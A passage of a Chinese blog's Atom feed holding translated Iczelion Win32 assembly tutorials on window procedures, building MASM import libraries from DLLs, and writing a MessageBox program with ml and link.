proc hWnd：HWND， uMsg：UINT， wParam：WPARAM， lParam：LPARAM</span><br></pre></td></tr></table></figure><p>是我们的窗口处理函数。您可以随便给该函数命名。其中第一个参数 hWnd 是接收消息的窗口的句柄。uMsg 是接收的消息。注意 uMsg 不是一个 MSG 结构，其实上只是一个 DWORD 类型数。Windows 定义了成百上千个消息，大多数您的应用程序不会处理到。当有该窗口的消息发生时，Windows 会发送一个相关消息给该窗口。其窗口过程处理函数会智能的处理这些消息。wParam 和 lParam 只是附加参数，以方便传递更多的和该消息有关的数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.IF uMsg==WM_DESTROY</span><br><span class="line">invoke PostQuitMessage，NULL</span><br><span class="line">.ELSE </span><br><span class="line">invoke DefWindowProc，hWnd，uMsg，wParam，lParam</span><br><span class="line">ret</span><br><span class="line">.ENDIF</span><br><span class="line">xor eax，eax </span><br><span class="line">ret</span><br><span class="line">WndProc endp</span><br></pre></td></tr></table></figure><p><strong>上面可以说是关键部分。这也是我们写 Windows 程序时需要改写的主要部分。</strong>此处您的程序检查 Windows 传递过来的消息，如果是我们感兴趣的消息则加以处理，处理完后，在 eax 寄存器中传递 0，否则必须调用 <code>DefWindowProc</code>，把该窗口过程接收到的参数传递给缺省的窗口处理函数。所有消息中您<strong>必须处理的是 <code>WM_DESTROY</code></strong>，当您的应用程序结束时 Windows 把这个消息传递进来，当您的应用程序接收到该消息时它已经在屏幕上消失了，这仅是通知您的应用程序窗口已销毁，您必须自己准备返回 Windows 。在此消息中您可以做一些清理工作，但无法阻止退出应用程序。如果您要在窗口销毁前做一些额外工作，可以处理 <code>WM_CLOSE</code> 消息。在处理完清理工作后，您必须调用 <code>PostQuitMessage</code>，该函数会把 <code>WM_QUIT</code> 消息传回您的应用程序，而该消息会使得 GetMessage 返回，并在 eax 寄存器中放入 0，然后会结束消息循环并退回 WINDOWS。您可以在您的程序中调用 <code>DestroyWindow</code> 函数，它会发送一个 WM_DESTROY 消息给您自己的应用程序，从而迫使它退出。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将写一个 Windows 程序，它会在桌面显示一个标准的窗口，以此根据代码来学习如何创建一个简单的窗口。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>怎样建立你自己的MASM导入库</title>
    <link href="http://hacktech.cn/2018/02/06/%E6%80%8E%E6%A0%B7%E5%BB%BA%E7%AB%8B%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84MASM%E5%AF%BC%E5%85%A5%E5%BA%93.html"/>
    <id>http://hacktech.cn/2018/02/06/怎样建立你自己的MASM导入库.html</id>
    <published>2018-02-06T12:00:49.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<p>by Iczelion （翻译：花心萝卜<a href="mailto:yqzq@163.net" target="_blank" rel="noopener">yqzq@163.net</a>) 9.5.2000</p><p>这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。</p><a id="more"></a><hr><h2 id="MASM导入库的格式："><a href="#MASM导入库的格式：" class="headerlink" title="MASM导入库的格式："></a>MASM导入库的格式：</h2><hr><p>MASM和VC++可以使用相同的导入库，MS导入库使用不同于TASM的OMF格式的变更的COFF文件格式，这就是为什么TASM和MASM的导入库不能互用的原因，我将不详细介绍有关MS导入库的格式。可以这样说，每一个MS导入库都包含某个DLL中函数的信息（你将要用这些信息来调用DLL中的函数），这些信息包括函数名和它所有参数的尺寸。如果你用一个文本编辑器打开kernel32.lib，你回发现一些如下格式的信息：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_ExitProcess@4 </span><br><span class="line">_CreateProcessA@40</span><br></pre></td></tr></table></figure><p>函数名被装饰上了一个“_”，在“@”之后的数字表示了该函数所有参数的尺寸（字节为单位），ExitProcess 函数只有一个DWORD的参数，所以后面的数字是4。 LIB中为什么要包含这些参数尺寸的信息呢？当你用INVOKE调用函数时，这些信息被用来检测传递给函数的参数是否正确。如果你使用“手工”将参数压入堆栈，并通过“CALL”来调用函数的话，MASM将无法检测参数是否正确。这将导致我们几乎没有办法建立一个DLL的导入库，因为DLL并不包含清楚的关于参数尺寸的信息。</p><hr><h2 id="从DLL建立MASM导入库"><a href="#从DLL建立MASM导入库" class="headerlink" title="从DLL建立MASM导入库"></a>从DLL建立MASM导入库</h2><hr><p>如果你很乐意用“手动”（CALL）的方法去调用函数的话，你可以象下面这样为任何一个DLL建立MASM的导入库：<br>使用dumpbin.exe,它可以导出DLL 输出（EXPORT）函数的名字。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dumpbin /EXPORTS  blah.dll  &gt;  output.txt</span><br></pre></td></tr></table></figure></p><p>在你获得了函数名列表之后，通过他们建立一个模块定义文件（.DEF）。 举个例子：如果DLL只包含一个函数：GetSomeLine 在一个文本文件中输入如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY blah </span><br><span class="line">EXPORTS </span><br><span class="line">GetSomeLine</span><br></pre></td></tr></table></figure><p>并将其保存为“blah.def<br>象这样，运行lib.exe，通过模块定义文件建立一个导入库：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lib /DEF:blah.def</span><br></pre></td></tr></table></figure><p>就是它了！你将获得blah.lib,只要你不使用INVOKE调用函数的话，你就可以在MASM中使用它。</p><hr><h2 id="建立通过INVOKE调用函数的MASM导入库"><a href="#建立通过INVOKE调用函数的MASM导入库" class="headerlink" title="建立通过INVOKE调用函数的MASM导入库:"></a>建立通过INVOKE调用函数的MASM导入库:</h2><hr><p>我并不反对你使用上面的方法，但INVOKE确实是一个调用函数的好途径。这也是我较TASM更喜欢MASM的原因之一。但就象我早先强调的，我们几乎不可能从一个DLL建立一个能100%工作的MASM导入库。如果你使用INVOKE，你将不能用上面的方法建立一个MASM导入库。举个例子，你可以想象如果你在.DEF文件中修改了函数的“@XX”部分，导入库将仍然正常建立，但请相信我，他不会工作的。 建立一个可以使用INVOKE的导入库的一个简单的方法是使用MASM。如果你写过DLL的代码，你会发现你不仅的到了一个DLL，而且还得到了一个导入库，没错，它就是我们要得！ 我们的策略是： </p><ol><li>获得函数名和所有参数的尺寸</li><li>建立一个包含正确个数和尺寸的DLL源代码 </li><li>建立一个描述ASM源代码中相应函数的模块定义文件（.DEF） </li><li>将源代码按DLL汇编 </li></ol><p>你将获得一个功能完全的MASM导入库，上面的步骤应做更多的说明 </p><hr><h2 id="获得函数名和所有参数尺寸"><a href="#获得函数名和所有参数尺寸" class="headerlink" title="获得函数名和所有参数尺寸"></a>获得函数名和所有参数尺寸</h2><hr><p>这是我们处理过程中最困难的部分了。如果你仅仅只有DLL，你将经历无意义的冒险。下面是我所能想出的方法，不过没有一个能100%工作。  </p><p>使用交互式反编译工具（Interactive Disassembler (IDA)）反编译DLL，通过这个奇妙的工具，你可以获得函数参数的大概尺寸，但这些信息是不完全的，IDA是一个功能强大的工具，不过有时必须靠我们自己判断什么是什么。你将不得不仔细分析反编译后的结果。  </p><p>观察堆栈指针在调用函数之前和之后的值。方法如下：  </p><ol><li>通过GetProcAddress获得函数的地址。</li><li>调用想要测试的每一个函数，但请注意，调用这些函数时，不要给他们传递任何的参数。调用前请注意ESP的值。</li><li>当函数返回后，比较调用函数前、后ESP的值。基本原理是：stdcall参数调用协定规定，函数自己负责恢复堆栈，现在知道为什么我们要不传递任何参数了吧，我们没传递参数，而函数却自作聪明“恢复”了ESP指针，所以ESP的变化值就是我们要得参数尺寸了。</li></ol><p>不过，上面的方法并不是万无一失的，下面的这些情况将会导致失败：</p><ul><li>如果DLL中的函数使用了不同于stdcall的别的参数传递协定。</li><li>如果函数在恢复堆栈时失败，我们将无法得到ESP的正确值。</li><li>如果这个函数的作用是去做一些危险的事情，比如硬盘格式化，那我们即使得到了ESP，恐怕代价大了点</li></ul><p>研究现有的使用DLL的程序，你可以通过调试/反编译这些程序去获得函数参数的个数和尺寸。不论如何，只要有函数在DLL中，而又没有任何程序调用过它，你可以用上面的两个方法。 </p><hr><h2 id="建立我们自己的DLL"><a href="#建立我们自己的DLL" class="headerlink" title="建立我们自己的DLL"></a>建立我们自己的DLL</h2><hr><p>在你获得了函数的名字和参数尺寸后，你可以建立一个DLL框架并在框架中添加和其他DLL、文件中的相同名称的函数。举个例子，如果DLL只含有一个函数：GetSomeLine.它有16BYTES的参数。在ASM文件中，你可以这样写： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">.code </span><br><span class="line">GetSomeLine proc param1:DWORD, param2:DWORD, param3:DWORD, param4:DWORD </span><br><span class="line">GetSomeline endp </span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>你可能要问，“这是什么？”。一个没有处理部分的程序？请记住：一个导入库并没有记录一个函数是如何实现的，它只是记录函数名和参数尺寸而已，它的任务就是提供函数的名称和尺寸。所以我们不需要添加函数的处理部分。当我们建立DLL时，MASM会帮我们完成它的导入库的建立。 MASM在建立导入库时并不关心每个具体参数的尺寸，它总是象下面这样：<br>　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">.code </span><br><span class="line">GetSomeLine proc param1:BYTE, param2:BYTE, param3:BYTE, param4:BYTE </span><br><span class="line">GetSomeline endp </span><br><span class="line">end</span><br></pre></td></tr></table></figure></p><p>然后MASM将在导入库中建立_GetSomeLine@16(它会把每一个参数看作DWORD)，而并不管它的参数是4个BYTE还是DWORD或是其他什么</p><hr><h2 id="建立匹配的模块定义文件（-DEF）"><a href="#建立匹配的模块定义文件（-DEF）" class="headerlink" title="建立匹配的模块定义文件（.DEF）"></a>建立匹配的模块定义文件（.DEF）</h2><hr><p>这是一个简单的工作，你需要这个文件来指导MASM去建立正确的DLL和与之匹配的导入库。一个模块定义文件模板如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIBRARY  &lt;The name of the DLL&gt; </span><br><span class="line">EXPORTS </span><br><span class="line">&lt;The names of the functions&gt;</span><br></pre></td></tr></table></figure><p>你仅仅需要填入DLL的名字，然后在EXPORTS下添入函数的名字。每个函数名一行。保存文件，你将获得一个模块定义文件。 </p><hr><h2 id="汇编DLL源代码"><a href="#汇编DLL源代码" class="headerlink" title="汇编DLL源代码"></a>汇编DLL源代码</h2><hr><p>最后一步也是最简单的一步，仅仅需要ML.EXE和LINK.EXE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ml /c /coff /Cp blah.asm </span><br><span class="line">link /DLL /NOENTRY /def:blah.def /subsystem:windows blah.obj</span><br></pre></td></tr></table></figure></p><p>好了，查看一下你的项目目录，你会发现你想要的导入库和DLL。</p><p><strong>转自<a href="http://blog.csdn.net/taowen2002/article/details/15837" target="_blank" rel="noopener">http://blog.csdn.net/taowen2002/article/details/15837</a></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;by Iczelion （翻译：花心萝卜&lt;a href=&quot;mailto:yqzq@163.net&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;yqzq@163.net&lt;/a&gt;) 9.5.2000&lt;/p&gt;
&lt;p&gt;这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。&lt;/p&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>win32 汇编学习(2)：消息框</title>
    <link href="http://hacktech.cn/2018/02/05/win32-%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2-%EF%BC%9A%E6%B6%88%E6%81%AF%E6%A1%86.html"/>
    <id>http://hacktech.cn/2018/02/05/win32-汇编学习-2-：消息框.html</id>
    <published>2018-02-05T09:04:32.000Z</published>
    <updated>2018-09-07T08:34:33.085Z</updated>
    
    <content type="html"><![CDATA[<p>这一次，我们将用汇编语言写一个 Windows 程序，程序运行时将弹出一个消息框并显示”你好，我的第一个Win32汇编程序”。</p><a id="more"></a><h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><p>Windows 为编写应用程序提供了大量的资源。其中最重要的是Windows API (Application Programming Interface)。 Windows API是一大组功能强大的函数，它们本身驻扎在 Windows 中供人们随时调用。这些函数的大部分被包含在几个动态链接库(DLL)中，譬如：kernel32.dll、 user32.dll 和 gdi32.dll。 Kernel32.dll中的函数主要处理内存管理和进程调度；user32.dll中的函数主要控制用户界面；gdi32.dll中的函数则负责图形方面的操作。除了上面主要的三个动态链接库，您还可以调用包含在其他动态链接库中的函数，当然您必须要有关于这些函数的足够的资料。  </p><p>动态链接库，顾名思义，这些 API 的代码本身并不包含在 Windows 可执行文件中，而是当要使用时才被加载。为了让应用程序在运行时能找到这些函数，就必须事先把有关的重定位信息嵌入到应用程序的可执行文件中。这些信息存在于引入库中，由链接器把相关信息从引入库中找出插入到可执行文件中。您必须指定正确的引入库，因为只有正确的引入库才会有正确的重定位信息。  </p><p>当应用程序被加载时 Windows 会检查这些信息，这些信息包括动态链接库的名字和其中被调用的函数的名字。若检查到这样的信息，Windows 就会加载相应的动态链接库，并且重定位调用的函数语句的入口地址，以便在调用函数时控制权能转移到函数内部。  </p><p>如果从和字符集的相关性来分，API 共有两类：一类是处理 ANSI 字符集的，另一类是处理 UNICODE 字符集的。前一类函数名字的尾部带一个”A”字符，处理UNICODE的则带一个”W”字符(宽字符)。我们比较熟悉的ANSI字符串是以 0 (NULL) 结尾的一串字符数组，每一个ANSI字符是一个 BYTE 宽。对于欧洲语言体系，ANSI 字符集已足够了，但对于有成千上万个唯一字符的几种象形语言体系来说就只有用 UNICODE 字符集了。每一个 UNICODE 字符占有两个 BYTE 宽，这样一来就可以在一个字符串中使用 65336 个不同字符了。  </p><p>这也是为什么引进 UNICODE 的原因。在大多数情况下我们都可以包含一个头文件，在其中定义一个宏，然后在实际调用函数时，函数名后不需要加后缀”A”或”W”。<br>如在头文件中定义函数<code>foo()</code>；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> foo() fooW()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> foo() fooA()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我先把程序框架放在下面，然后我们再向里面加东西。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat， stdcall</span><br><span class="line">.data</span><br><span class="line">.code</span><br><span class="line">start：</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>应用程序的执行是从 END 定义的标识符后的第一条语句开始的。在上面的框架程序中就是从 START 开始。程序逐条语句执行一直到遇到 JMP，JNE，JE，RET 等跳转指令。这些跳转指令将把执行权转移到其他语句上，若程序要退出 Windows，则必须调用函数 ExitProcess。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExitProcess proto uExitCode：DWORD</span><br></pre></td></tr></table></figure><p>上面一行是函数原型。函数原型会告诉编译器和链接器该函数的属性，这样在编译和链接时，编译器和链接器就会作相关的类型检查。 函数的原型定义如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FunctionName PROTO [ParameterName]：DataType，[ParameterName]：DataType，...</span><br></pre></td></tr></table></figure><p>简言之，就是在函数名后加伪指令PROTO，再跟一串由逗号相隔的数据类型链表。在前面的 ExitProcess 定义中，该函数有一个 DWORD 类型的参数。当您使用高层调用语句 INVOKE 时，使用函数原型定义特别有用，您可以简单地认为 <strong>INVOKE 是一个有参数类型检查的调用语句</strong>。譬如，假设您这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call ExitProcess</span><br></pre></td></tr></table></figure><p>若您事先没把一个DWORD类型参数压入堆栈，编译器和链接器都不会报错，但毫无疑问，在您的程序运行时将引起崩溃。但是，当您这样写：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke ExitProcess</span><br></pre></td></tr></table></figure><p>连接器将报错提醒您忘记压入一个 DWORD 类型参数。所以我<strong>建议您用 INVOKE 指令而不是CALL去调用一个函数</strong>。INVOKE 的语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INVOKE expression [，arguments]</span><br></pre></td></tr></table></figure><p>expression <strong>既可以是一个函数名也可以是一个函数指针</strong>。参数由逗号隔开。大多数API函数的原型放在头文件中。 如果您用的是 MASM32，这些头文件在文件夹MASM32/include 下， 这些头文件的扩展名为 INC，函数名和 DLL 中的函数名相同，譬如：KERNEL32.LIB 引出的函数 ExitProcess 的函数原形声明于kernel.inc中。您也可以自己声明函数原型。 </p><p>好，我们现在回到ExitProcess 函数，参数uExitCode 是您希望当您的应用程序结束时传递 Windows 的。 您可以这样写： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke ExitProcess，0</span><br></pre></td></tr></table></figure><p>把这一行放到<code>start</code>标识符下，这个应用程序就会立即退出 Windows，当然毫无疑问个应用程序本身是一个完整的 Windows 程序。</p><p><strong>IDE为Visual MASM，masm32安装在c:\masm32</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">386</span><br><span class="line">.model flat， stdcall</span><br><span class="line">option casemap：none</span><br><span class="line"></span><br><span class="line">include c:\masm32\include\windows.inc</span><br><span class="line">include c:\masm32\include\kernel32.inc</span><br><span class="line">includelib c:\masm32\lib\kernel32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke ExitProcess，0</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><code>option casemap：none</code> 一句的意思是告诉 MASM 要区分标号的大小写，譬如：start 和 START 是不同的。请注意新的伪指令 include，跟在其后的文件名所指定的文件在编译时将“插”在该处。在我们上面的程序段中，当MASM处理到语句 <code>include c:\masm\include\windows.inc</code> 时，它就会打开文件夹c:\masm32\include 中的文件windows.inc，这和您把整个文件都粘贴到您的源程序中的效果是一样的。 windows.inc 包含了 WIN32 编程所需要的常量和结构体的定义。 但是它不包含函数原型的定义。  </p><p>您的应用程序除了从 windows.inc 中得到相关变量结构体的定义外，还需要从其他的头文件中得到函数原型的声明，这些头文件都放在 c:\masm32\include 文件夹中。 在我们上面的例子中调用了 kernel.dll 中的函数，所以需要包含有这个函数原型声明的头文件 kernel.inc。如果用文本编辑器打开该文件您会发现里面全是从 kernel.dll中引出的函数的声明。如果您不包含kernel.inc，您仍然可以调用（call）ExitProcess，但不能够调用（invoke）ExitProcess（这会无法通过编译器和连接器的参数合法性检查）。所以若用 invoke 去调用一个函数，您就必须事先声明包含头文件，您完全可以在调用该函数前在源代码的适当位置进行声名。包含头文件主要是为了节省时间（当然还有正确性）  </p><p>接下来我们来看看 <code>includelib</code> 伪指令，和 <code>include</code> 不同，它仅仅是告诉编译器您的程序引用了哪个库。当编译器处理到该指令时会在生成的目标文件中插入链接命令告诉链接器链入什么库。当然您还可以通过在链接器的命令行指定引入库名称的方法来达到和用includelib指令相同的目的，但考虑到命令行仅能够传递128个字符而且要不厌其烦地在命令行敲字符，所以这种方法是非常不可取的。</p><h3 id="命令行编译"><a href="#命令行编译" class="headerlink" title="命令行编译"></a>命令行编译</h3><p>好了，现在保存例子，取名为msgbox.asm。把 ml.exe（C:\masm32\bin） 的路径放到 PATH 环境变量中，键入下面一行 进行编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ml /c /coff /Cp msgbox.asm</span><br></pre></td></tr></table></figure><ul><li><code>/c</code> 是告诉MASM只编译不链接。这主要是考虑到在链接前您可能还有其他工作要做。 </li><li><code>/coff</code> 告诉MASM产生的目标文件用 coff 格式。MASM 的 coff 格式是COFF（Common Object File Format：通用目标文件格式） 格式的一种变体。在 UNIX 下的 COFF 格式又有不同。 </li><li><code>/Cp</code> 告诉 MASM 不要更改用户定义的标识符的大小写。在.model 指令下加入 “option casemap：none” 语句，可达到同样的效果。<br>当您成功的编译了 msgbox.asm 后，编译器会产生 msgbox.obj 目标文件，目标文件和可执行文件只一步之遥，目标文件中包含了以二进制形式存在的指令和数据，比可执行文件相差的只是链接器加入的重定位信息。 </li></ul><p>好，我们来链接目标文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link /SUBSYSTEM：WINDOWS /LIBPATH：c：\masm32\lib msgbox.obj</span><br></pre></td></tr></table></figure><ul><li><code>/SUBSYSTEM：WINDOWS</code> 告诉链接器可执行文件的运行平台 </li><li><code>/LIBPATH：〈path to import library〉</code> 告诉链接器引入库的路径。<br>链接器做的工作就是根据引入库往目标文件中加入重定位信息，最后产生可执行文件。 既然得到了可执行文件，我们来运行一下。好，一、二、三，GO！屏幕上什么都没有。哦，对了，我们除了调用了 ExitProcess 函数外，什么都还没做呢！但是别一点成就感都没有哦，因为我们用汇编所写的是一个真正 Windows 程序，不信的话，看看您磁盘上的 msgbox.exe文件。</li></ul><p>下面我们来做一点可以看的见摸的着的，我们在程序中加入一个对话框。该函数的原型如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBox PROTO hwnd：DWORD， lpText：DWORD， lpCaption：DWORD， uType：DWORD</span><br></pre></td></tr></table></figure><ul><li><code>hWnd</code> 是父窗口的句柄。句柄代表您引用的窗口的一个地址指针。它的值对您编 Windows 程序并不重要（译者注：如果您想成为高手则是必须的），您只要知道它代表一个窗口。当您要对窗口做任何操作时，必须要引用该窗口的指针。 </li><li><code>lpText</code> 是指向您要显示的文本的指针。指向文本串的指针事实上就是文本串的首地址。 </li><li><code>lpCaption</code> 是指向您要显示的对话框的标题文本串指针。 </li><li><code>uType</code> 是显示在对话框窗口上的小图标的类型。</li></ul><p>下面是源程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">include \masm32\include\windows.inc </span><br><span class="line">include \masm32\include\kernel32.inc </span><br><span class="line">includelib \masm32\lib\kernel32.lib </span><br><span class="line">include \masm32\include\user32.inc </span><br><span class="line">includelib \masm32\lib\user32.lib </span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">MsgBoxCaption db &quot;可爱的标题&quot;，0</span><br><span class="line">MsgBoxText    db &quot;你好，我的第一个Win32汇编程序&quot;，0</span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">start: </span><br><span class="line">invoke MessageBox, NULL, addr MsgBoxText, addr MsgBoxCaption, MB_OK </span><br><span class="line">invoke ExitProcess, NULL </span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>编译、链接上面的程序段，得到可执行文件。运行，哈哈，窗口上弹出了一个对话框，上面有一行字：“你好，我的第一个Win32汇编程序”。</p><p>好，我们回过头来看看上面的源代码。我们在.DATA“分段”定义了两个NULL结尾的字符串。我们用了两个常量：<code>NULL</code> 和 <code>MB_OK</code>。这些常量在windows.inc 文件中有定义，使用常量使得您的程序有较好的可读性。 <code>addr</code> 操作符用来把标号的地址传递给被调用的函数，它只能用在 <code>invoke</code> 语句中，譬如您不能用它来把标号的地址赋给寄存器或变量，如果想这样做则要用 <code>offset</code> 操作符。在 <code>offset</code> 和 <code>addr</code> 之间有如下区别：</p><p><code>addr</code>不可以处理向前引用，<code>offset</code>则能。所谓向前引用是指：标号的定义是在<code>invoke</code> 语句之后，譬如在如下的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">invoke MessageBox，NULL， addr MsgBoxText，addr MsgBoxCaption，MB_OK</span><br><span class="line"></span><br><span class="line">...... </span><br><span class="line"></span><br><span class="line">MsgBoxCaption db &quot;可爱的标题&quot;，0</span><br><span class="line">MsgBoxText db &quot;你好，我的第一个Win32汇编程序&quot;，0</span><br></pre></td></tr></table></figure><p>如果您是用 <code>addr</code> 而不是 <code>offset</code> 的话，那 MASM 就会报错。</p><p><code>addr</code>可以处理局部变量而 <code>offset</code> 则不能。局部变量只是在运行时在堆栈中分配内存空间。而 <code>offset</code> 则是在编译时由编译器解释，这显然不能用 <code>offset</code> 在运行时来分配内存空间。编译器对 <code>addr</code> 的处理是先检查处理的是全局还是局部变量，若是全局变量则把其地址放到目标文件中，这一点和 <code>offset</code> 相同，若是局部变量，就在执行 <code>invoke</code> 语句前产生如下指令序列： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea eax， LocalVar</span><br><span class="line">push eax</span><br></pre></td></tr></table></figure><p>因为<code>lea</code>指令能够在运行时决定标号的有效地址，所以有了上述指令序列，就可以保证 <code>invoke</code> 的正确执行了。 </p><h3 id="更方便的编译选择：Visual-MASM"><a href="#更方便的编译选择：Visual-MASM" class="headerlink" title="更方便的编译选择：Visual MASM"></a>更方便的编译选择：Visual MASM</h3><p>新建一个asm后缀文件，用Visual MASM打开，把上面的代码复制进去，点击左上角的Run即可，如图所示。<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fo72650fqnj20ux0ian06.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一次，我们将用汇编语言写一个 Windows 程序，程序运行时将弹出一个消息框并显示”你好，我的第一个Win32汇编程序”。&lt;/p&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(1)：基本概念</title>
    <link href="http://hacktech.cn/2018/02/05/Win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1-%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html"/>
    <id>http://hacktech.cn/2018/02/05/Win32汇编学习-1-：基本概念.html</id>
    <published>2018-02-05T05:45:40.000Z</published>
    <updated>2018-09-07T08:34:33.081Z</updated>
    
